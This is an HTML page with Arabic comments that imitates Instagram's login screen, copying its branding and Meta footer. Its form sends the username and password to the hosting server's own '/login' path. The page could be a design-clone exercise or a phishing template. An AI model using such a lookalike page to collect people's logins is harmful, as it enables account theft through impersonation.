<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #000000;
            color: #f5f5f5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: space-between;
        }
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            padding: 20px;
        }
        .content-wrapper {
            display: flex;
            align-items: center;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            gap: 32px;
        }
        .left-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 450px;
        }
        .left-section h1 {
            font-size: 3rem;
            font-weight: 600;
            text-align: center;
            line-height: 1.2;
            margin-bottom: 24px;
        }
        .left-section h1 span {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .preview-box {
            background: #121212;
            border: 1px solid #262626;
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            width: 100%;
        }
        .right-section {
            width: 350px;
        }
        .login-card {
            background-color: #000000;
            border: 1px solid #262626;
            border-radius: 4px;
            padding: 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        .instagram-logo {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .input-field {
            width: 100%;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 3px;
            padding: 12px 9px;
            margin-bottom: 6px;
            color: #f5f5f5;
            font-size: 12px;
            outline: none;
        }
        .input-field:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
            margin-bottom: 20px;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0 25px 0;
            color: #a8a8a8;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #262626;
        }
        .divider::before {
            margin-right: 18px;
        }
        .divider::after {
            margin-left: 18px;
        }
        .forgot-password {
            color: #e0e0e0;
            font-size: 12px;
            text-decoration: none;
        }
        .signup-card {
            background-color: #000000;
            border: 1px solid #262626;
            border-radius: 4px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        footer {
            padding: 20px;
            text-align: center;
            color: #a8a8a8;
            font-size: 12px;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #a8a8a8;
            text-decoration: none;
        }
        @media (max-width: 768px) {
            .left-section {
                display: none;
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="content-wrapper">
            <!-- القسم اليساري (النص والتصميم الإجمالي) -->
            <div class="left-section">
                <h1>See everyday moments from your <span>close friends.</span></h1>
            </div>

            <!-- القسم اليميني (نموذج تسجيل الدخول - بدون زر الفيسبوك) -->
            <div class="right-section">
                <div class="login-card">
                    <div class="instagram-logo">Instagram</div>
                    
                    <form action="/login" method="POST">
                        <input type="text" name="email" class="input-field" placeholder="Phone number, username, or email" required>
                        <input type="password" name="password" class="input-field" placeholder="Password" required>
                        <button type="submit" class="login-btn">Log in</button>
                    </form>

                    <div class="divider">OR</div>

                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>

                <div class="signup-card">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
        </div>
    </div>

    <!-- الفوتر السفلي -->
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div>© 2026 Instagram from Meta</div>
    </footer>

</body>
</html>
